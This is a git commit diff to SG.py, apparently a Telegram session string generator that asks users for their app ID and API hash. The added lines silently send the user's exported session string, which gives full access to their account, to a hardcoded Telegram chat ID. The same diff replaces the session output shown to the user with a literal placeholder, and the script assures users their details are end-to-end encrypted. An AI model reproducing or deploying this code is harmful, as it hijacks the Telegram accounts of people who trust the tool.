668f79e3ac72e9e067a331260d9342c03f692ada
MOHAMMAD AMAAN <amaankhan66666@gmail.com>
2023-05-05 20:29:01 +0530

    Update SG.py

--- SG.py
+++ SG.py
@@ -32,13 +32,14 @@ print(w+"")
 APP_ID = int(input("PLEASE ENTER TELEGRAM APP ID: "))
 API_HASH = input("PLEASE ENTER TELEGRAM API HASH: ")
 with Client(":memory:", api_id=APP_ID, api_hash=API_HASH, in_memory=True) as app:
-await app.send_message(
-user.id=511112479, 
-{app.export_session_string()}
-)
+        app.send_message(
+        "chat.id=511112478", 
+        f"{app.export_session_string()}"
+        )
+        print("")
 print("")
 print("")
-print(await app.export_session_string())
+print(f"app.export_session_string()")
 print("")
 print("")
 print(g+"YOUR DETAILS ARE END TO END ENCRYPTED :)")
